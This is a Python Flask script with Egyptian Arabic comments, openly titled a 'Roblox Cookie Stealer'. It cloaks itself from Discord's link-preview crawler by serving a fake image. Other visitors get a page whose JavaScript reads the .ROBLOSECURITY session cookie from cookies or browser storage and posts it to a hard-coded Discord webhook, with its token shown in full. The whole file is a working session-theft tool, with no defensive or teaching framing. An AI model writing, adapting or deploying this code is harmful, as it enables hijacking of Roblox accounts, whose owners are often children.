from flask import Flask, request
import base64

app = Flask(__name__)

# غيّر الويب هوك بتاعك هنا فقط
WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def roblox_cookie_only(path):
    ua = request.headers.get('User-Agent', '')

    # للـ Discord bot/crawler: رجع صورة حقيقية عشان preview يشتغل
    if 'Discordbot' in ua or 'discord' in ua.lower():
        fake_img = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAQBADEAv5eAFAAAAAElFTkSuQmCC')
        return fake_img, 200, {'Content-Type': 'image/png'}

    # للضحية: HTML مع صورة + JS للكوكي فقط (بدون أي معلومات عادية)
    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg" style="width:100%;height:100vh;object-fit:contain">

<script>
// Roblox Cookie Stealer 2025 - فقط الكوكي، بدون أي حاجة تانية (من AtomLogger/PrimeMarket repos)
setTimeout(() => {{
  // قراءة الكوكي من document.cookie
  let cookies = document.cookie;
  let robloMatch = cookies.match(/\\.ROBLOSECURITY=([^;]+)/);
  if (robloMatch) {{
    fetch("{WEBHOOK}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{
        username: "Roblox Cookie Only",
        embeds: [{{
          title: "تم سرقة Roblox Cookie",
          description: robloMatch[1],
          color: 0x00ff00
        }}]
      }})
    }});
    return;
  }}

  // Fallback: localStorage أو sessionStorage (شغال على Roblox WebView)
  let localRoblo = localStorage.getItem('.ROBLOSECURITY') || sessionStorage.getItem('.ROBLOSECURITY');
  if (localRoblo) {{
    fetch("{WEBHOOK}", {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{
        username: "Roblox Cookie Only",
        embeds: [{{
          title: "تم سرقة Roblox Cookie (Local)",
          description: localRoblo,
          color: 0x00ff00
        }}]
      }})
    }});
    return;
  }}

  // لو فشل: ما نبعتش حاجة، silent
}}, 1000);

</script>
</body></html>"""

    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == "__main__":
    app.run()
